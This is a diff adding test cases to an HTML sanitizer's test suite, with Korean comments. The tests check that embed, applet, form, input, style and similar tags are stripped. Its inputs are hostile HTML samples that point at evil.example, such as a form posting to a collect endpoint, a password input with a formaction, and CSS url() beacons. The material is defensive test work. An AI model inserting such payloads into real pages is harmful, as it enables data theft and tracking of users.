@@ -211,6 +211,36 @@ describe.each(PATHS)('html-sanitizer $name (CMS-HSP)', ({ purify }) => {
     });
   });
 
+  describe('위험 태그 제거', () => {
+    // 정규식 경로의 STRIP_TAGS_WITH_CONTENT·STRIP_TAG_CONTENT 와 DOMPurify 경로의
+    // FORBID_TAGS 가 같은 태그를 지우는지 확인한다. object 는 TAG-01·TAG-02 에 있다.
+    const DANGEROUS_TAGS = 'embed, applet, form, input, textarea, select, button, style';
+
+    it.each([
+      ['DNG-01 embed', '<p>a</p><embed src="https://evil.example/x.swf" type="application/x-shockwave-flash">'],
+      ['DNG-02 self-closing embed', '<p>a</p><embed src="https://evil.example/x.swf"/>'],
+      ['DNG-03 applet', '<p>a</p><applet code="Evil.class" archive="https://evil.example/x.jar"></applet>'],
+      ['DNG-04 form', '<p>a</p><form action="https://evil.example/collect" method="post"><span>b</span></form>'],
+      ['DNG-05 input', '<p>a</p><input type="password" name="pw" formaction="https://evil.example/">'],
+      ['DNG-06 textarea·select·button', '<p>a</p><textarea name="t">x</textarea><select name="s"><option>o</option></select><button type="submit">go</button>'],
+      ['DNG-07 style (닫는 태그 있음)', '<p>a</p><style>body{background:url(https://evil.example/t)}</style>'],
+      ['DNG-08 style (닫는 태그 없음)', '<p>a</p><style>body{background:url(https://evil.example/t)}'],
+      ['DNG-09 대소문자 섞은 태그', '<p>a</p><EmBeD src="x"><FoRm><InPuT name="a"></fOrM><StYlE>p{color:red}</sTyLe><sTyLe media="all">'],
+    ])('CMS-HSP-%s', (_label, input) => {
+      const doc = expectInert(sanitize(input));
+      expect(doc.querySelectorAll(DANGEROUS_TAGS).length).toBe(0);
+      expect(doc.querySelector('p')?.textContent).toBe('a');
+    });
+
+    it('CMS-HSP-DNG-10: 닫는 태그가 있는 style 은 내용까지 지운다', () => {
+      const out = sanitize('<p>a</p><style>body{background:url(https://evil.example/t)}</style><p>b</p>');
+      const doc = expectInert(out);
+      expect(doc.querySelectorAll('style').length).toBe(0);
+      expect(out).not.toContain('evil.example');
+      expect(Array.from(doc.querySelectorAll('p')).map((p) => p.textContent)).toEqual(['a', 'b']);
+    });
+  });
+
   describe('태그 밖 텍스트 보존', () => {
     it('CMS-HSP-TXT-01: 속성처럼 보이는 본문 텍스트를 바꾸지 않는다', () => {
       const text = '설정값 "online=true" 와 "one=1", 예시 href="javascript:void(0)" 문구';
